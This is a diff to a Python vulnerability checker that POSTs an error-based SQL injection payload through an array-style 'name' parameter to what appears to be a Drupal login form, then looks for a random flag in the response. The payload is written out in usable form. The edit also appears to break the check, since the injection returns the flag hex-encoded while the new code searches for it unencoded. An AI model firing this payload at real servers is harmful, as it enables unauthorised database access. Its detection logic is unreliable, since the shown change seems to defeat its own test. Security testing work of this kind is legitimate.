@@ -27,11 +27,12 @@ def check_vuln(ip,port):
 	#print(url)
 	flag = ''.join(random.sample(string.ascii_letters, 20))  # 随机字符串，用以验证是否可以成功命令执行
 	data = "pass=lol&form_build_id=&form_id=user_login_block&op=Login&name[0 or updatexml(0,concat(0xa,hex('{flag}')),0)%23]=bob&name[0]=a".format(flag=flag)
-	data=bytes(data,encoding='utf-8')
+	data = data.encode()
 	try:
-		hex_flag = binascii.hexlify(flag)
+		#hex_flag = binascii.hexlify(flag)
 		res =requests.post(url=url,headers=headers,data=data,timeout=5)
-		if hex_flag.upper()[:-9] in res.text:			
+		#if hex_flag.upper()[:-9] in res.text:		
+		if flag in res.text:	
 			#print ("Vuln exists")
 			return True
 		else:
@@ -43,4 +44,4 @@ def check_vuln(ip,port):
 
 
 #if __name__ == '__main__':
-#  check_vuln('192.168.56.123',8080)
+#	check_vuln('192.168.56.123',8080)
